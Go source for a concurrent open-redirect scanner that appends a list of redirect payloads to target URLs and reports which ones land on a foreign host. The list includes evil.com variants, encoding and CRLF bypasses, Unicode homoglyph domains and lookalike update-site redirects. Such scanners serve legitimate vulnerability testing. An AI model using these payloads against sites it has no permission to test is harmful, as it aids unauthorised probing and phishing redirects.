package main

import (
	"bufio"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
)

var payloads = []string{
	`//evil.com`,
	`/\\evil.com`,
	`https://evil.com`,
	`//%2fevil.com`,
	`/\\evil.com`,
	`https://%0d%0aevil.com`,
	`/\\/%2fevil.com`,
	`http://evil.com/%2e%2e`,
	`/redirect?url=https://evil.com`,
	`/redirect?next=https://evil.com`,
	`//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ%00｡Ｐⓦ`,
	`//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ%E3%80%82pw`,
	`/.ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂`,
	`https://secure-site.com/redirect?url=//trusted-update.net`,
	`https://secure-site.com/redirect?url=/\%2e%2e/update-check.net`,
}

func checkOpenRedirect(target string, wg *sync.WaitGroup, results chan<- string) {
	defer wg.Done()

	parsedTarget, err := url.Parse(target)
	if err != nil {
		return
	}
	host := parsedTarget.Host

	for _, payload := range payloads {
		testURL := target + payload
		resp, err := http.Get(testURL)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		finalURL := resp.Request.URL.String()
		parsedFinal, err := url.Parse(finalURL)
		if err != nil {
			continue
		}

		// Confirma se o domínio final é diferente do original
		if parsedFinal.Host != "" && parsedFinal.Host != host {
			results <- testURL
			return
		}
	}
}

func processInput(scanner *bufio.Scanner, results chan<- string) {
	var wg sync.WaitGroup

	for scanner.Scan() {
		target := strings.TrimSpace(scanner.Text())
		if target == "" || !strings.HasPrefix(target, "http") {
			continue
		}
		wg.Add(1)
		go checkOpenRedirect(target, &wg, results)
	}

	wg.Wait()
	close(results)
}

func main() {
	var scanner *bufio.Scanner

	if len(os.Args) > 1 {
		file, err := os.Open(os.Args[1])
		if err != nil {
			return
		}
		defer file.Close()
		scanner = bufio.NewScanner(file)
	} else {
		scanner = bufio.NewScanner(os.Stdin)
	}

	results := make(chan string, 10)
	go processInput(scanner, results)

	for result := range results {
		fmt.Println("[+] OPEN REDIRECT FOUND:", result)
	}
}

